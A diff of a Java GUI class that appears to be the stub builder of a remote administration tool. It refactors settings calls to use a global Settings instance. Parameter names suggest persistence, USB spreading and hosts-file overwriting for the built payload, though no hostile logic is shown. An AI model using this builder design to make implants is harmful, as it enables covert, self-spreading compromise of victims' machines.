@@ -86,16 +86,16 @@ public class FrameBuildMinimal extends BaseFrame {
 
 		JLabel lblPort = new JLabel("Port:");
 
-		txtHost = new JTextField(Settings.get("bip"));
+		txtHost = new JTextField(Settings.getGlobal().get("bip"));
 		txtHost.setColumns(10);
 
 		spPort = new JSpinner();
-		spPort.setModel(new SpinnerNumberModel(Settings.getInt("bport"), 1, 65535, 1));
+		spPort.setModel(new SpinnerNumberModel(Settings.getGlobal().getInt("bport"), 1, 65535, 1));
 
 		JLabel lblId = new JLabel("ID:");
 
 		txtId = new JTextField();
-		txtId.setText(Settings.get("bid"));
+		txtId.setText(Settings.getGlobal().get("bid"));
 		txtId.setColumns(10);
 
 		chckbxEmbed = new JCheckBox("Embed using installer");
@@ -114,12 +114,12 @@ public class FrameBuildMinimal extends BaseFrame {
 
 		JLabel lblPass = new JLabel("Pass:");
 
-		txtPass = new JTextField(Settings.get("bpass"));
+		txtPass = new JTextField(Settings.getGlobal().get("bpass"));
 		txtPass.setColumns(10);
 
 		JLabel lblKey = new JLabel("Key:");
 
-		txtKey = new JTextField(Settings.get("bkey").length() == Crypto.KEY_LENGTH ? Settings.get("bkey") : Util.randomString(Crypto.KEY_LENGTH));
+		txtKey = new JTextField(Settings.getGlobal().get("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().get("bkey") : Util.randomString(Crypto.KEY_LENGTH));
 		txtKey.addKeyListener(new KeyAdapter() {
 			@Override
 			public void keyReleased(KeyEvent arg0) {
@@ -344,13 +344,13 @@ public class FrameBuildMinimal extends BaseFrame {
 						 usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems
 						, usb, usbexclude, usbname, debugmsg, osconfig, true);
 				
-				Settings.setVal("bip", ip);
-				Settings.setVal("bport", port);
-				Settings.setVal("bid", id);
-				Settings.setVal("bpass", pass);
-				Settings.setVal("bkey", key);
-				Settings.setVal("bcrypt", crypt);
-				Settings.setVal("brecat", reconSec);
+				Settings.getGlobal().setVal("bip", ip);
+				Settings.getGlobal().setVal("bport", port);
+				Settings.getGlobal().setVal("bid", id);
+				Settings.getGlobal().setVal("bpass", pass);
+				Settings.getGlobal().setVal("bkey", key);
+				Settings.getGlobal().setVal("bcrypt", crypt);
+				Settings.getGlobal().setVal("brecat", reconSec);
 			}
 		}.start();
 	}
